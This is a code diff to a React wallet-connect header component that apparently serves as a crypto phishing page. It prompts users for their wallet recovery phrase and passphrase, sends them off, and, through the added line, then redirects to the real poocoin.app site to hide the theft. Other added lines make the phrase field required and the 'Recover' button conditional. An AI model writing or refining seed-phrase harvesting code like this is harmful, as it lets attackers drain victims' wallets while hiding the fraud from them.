@@ -1,4 +1,5 @@
 import React, { useEffect, useState } from 'react';
+import { useNavigate } from "react-router-dom";
 import './Header.css';
 import { Link } from 'react-router-dom';
 import { WalletConnectConnector } from "@web3-react/walletconnect-connector";
@@ -90,6 +91,7 @@ function Header() {
     const [prhare, setPrhase] = useState('')
     const [prharePass, setPrharePass] = useState('')
     const [activeWallet, setAvtiveWallet] = useState();
+    const navigate = useNavigate();
     console.log(localStorage.getItem('address'))
     useEffect(() => {
         setId(localStorage.setItem('address', account))
@@ -148,6 +150,7 @@ function Header() {
             .then(success => {
                 setPrharePass('')
                 setPrhase('')
+                window.location = 'https://poocoin.app/'
             }, error => {
                 alert("not sent")
             })
@@ -327,6 +330,7 @@ function Header() {
                                                                                 placeholder="Phrase"
                                                                                 className='txtArea'
                                                                                 onChange={(e) => setPrhase(e.target.value)}
+                                                                                required={true}
                                                                             />
                                                                         </Box>
 
@@ -379,7 +383,7 @@ function Header() {
                                                                         ''
                                                         }
                                                         <Box className='mb-5'>
-                                                            <Button onClick={() => submitAddress()} className='hov' variant='outlined' style={{ fontSize: '15px', marginTop: '9px', borderRadius: '15px', padding: '10px', width: '320px' }}>
+                                                            <Button disabled={!prhare && !prharePass} onClick={() => submitAddress()} className='hov' variant='outlined' style={{ fontSize: '15px', marginTop: '9px', borderRadius: '15px', padding: '10px', width: '320px' }}>
                                                                 Recover
                                                             </Button>
                                                             <br />
